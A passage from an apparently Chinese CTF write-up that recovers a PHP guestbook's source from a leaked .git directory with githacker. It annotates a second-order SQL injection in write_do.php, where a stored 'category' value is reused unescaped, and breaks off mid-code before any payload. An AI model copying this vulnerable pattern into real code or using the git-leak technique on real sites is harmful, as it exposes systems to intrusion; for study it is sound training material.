&lt;p&gt;git push  origin master// 提交到远端仓库&lt;/p&gt;
&lt;p&gt;当 git 泄露时可以通过 githack 还原文件&lt;/p&gt;
&lt;p&gt;git log --reflog 可以查看提交记录&lt;/p&gt;
&lt;p&gt;通过 git reset --hard 更改指针位置&lt;/p&gt;
&lt;p&gt;通过 githacker 还原文件，如果不修改文件指针的情况下回还原下面的 write_do.php&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;mysql.php&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;session_start&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_SESSION&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;login&amp;#x27;&lt;/span&gt;] != &lt;span class=&#34;string&#34;&gt;&amp;#x27;yes&amp;#x27;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_ invoke__&#34;&gt;header&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Location: ./login.php&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;do&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;switch&lt;/span&gt; (&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;do&amp;#x27;&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;write&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;comment&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;default&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_ invoke__&#34;&gt;header&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Location: ./index.php&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_ invoke__&#34;&gt;header&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Location: ./index.php&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;需要换一个能还原指针位置的 githacker，别用 buuoj，sbbuuoj 不让扫描&lt;/p&gt;
&lt;p&gt;最后还原出的源码是&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//write_do.php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;mysql.php&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;session_start&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_SESSION&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;login&amp;#x27;&lt;/span&gt;] != &lt;span class=&#34;string&#34;&gt;&amp;#x27;yes&amp;#x27;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_ invoke__&#34;&gt;header&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Location: ./login.php&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;do&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;switch&lt;/span&gt; (&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;do&amp;#x27;&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;write&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$category&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;addslashes&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;category&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$title&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;addslashes&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;title&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$content&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;addslashes&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;content&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;insert into board&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            set category = &amp;#x27;&lt;span class=&#34;subst&#34;&gt;$category&lt;/span&gt;&amp;#x27;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;                title = &amp;#x27;&lt;span class=&#34;subst&#34;&gt;$title&lt;/span&gt;&amp;#x27;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;                content = &amp;#x27;&lt;span class=&#34;subst&#34;&gt;$content&lt;/span&gt;&amp;#x27;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_query&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_ invoke__&#34;&gt;header&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Location: ./index.php&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;comment&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$bo_id&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;addslashes&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;bo_id&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;select category from board where id=&amp;#x27;&lt;span class=&#34;subst&#34;&gt;$bo_id&lt;/span&gt;&amp;#x27;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_query&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$num&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_num_rows&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$num&lt;/span&gt;&amp;gt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$category&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_fetch_array&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt;)[&lt;span class=&#34;string&#34;&gt;&amp;#x27;category&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$content&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;addslashes&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;content&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;insert into comment&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            set category = &amp;#x27;&lt;span class=&#34;subst&#34;&gt;$category&lt;/span&gt;&amp;#x27;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;                content = &amp;#x27;&lt;span class=&#34;subst&#34;&gt;$content&lt;/span&gt;&amp;#x27;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;                bo_id = &amp;#x27;&lt;span class=&#34;subst&#34;&gt;$bo_id&lt;/span&gt;&amp;#x27;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_query&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_ invoke__&#34;&gt;header&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Location: ./comment.php?id=&lt;span class=&#34;subst&#34;&gt;$bo_id&lt;/span&gt;&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;default&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_ invoke__&#34;&gt;header&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Location: ./index.php&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_ invoke__&#34;&gt;header&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Location: ./index.php&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;注意如下代码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$category&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;addslashes&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;category&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$title&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;addslashes&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;title&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$content&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;addslashes&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;content&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;insert into board set category = &amp;#x27;&lt;span class=&#34;subst&#34;&gt;$category&lt;/span&gt;&amp;#x27;, title = &amp;#x27;&lt;span class=&#34;subst&#34;&gt;$title&lt;/span&gt;&amp;#x27;,content = &amp;#x27;&lt;span class=&#34;subst&#34;&gt;$content&lt;/span&gt;&amp;#x27;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_query&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//在插入的时候所有接收的参数都用了addslashes过滤，不存在漏洞&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$bo_id&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;addslashes&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;bo_id&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;select category from board where id=&amp;#x27;&lt;span class=&#34;subst&#34;&gt;$bo_id&lt;/span&gt;&amp;#x27;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_query&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$num&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_num_rows&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$num&lt;/span&gt;&amp;gt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$category&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_fetch_array&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt;)[&lt;span class=&#34;string&#34;&gt;&amp;#x27;category&amp;#x27;&lt;/span&gt;];    &lt;span class=&#34;comment&#34;&gt;# 注意这行，在从数据库中取出数据时没有过滤，存在二次注入&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$content&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;addslashes&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;content&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;insert into comment&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        set category = &amp;#x27;&lt;span 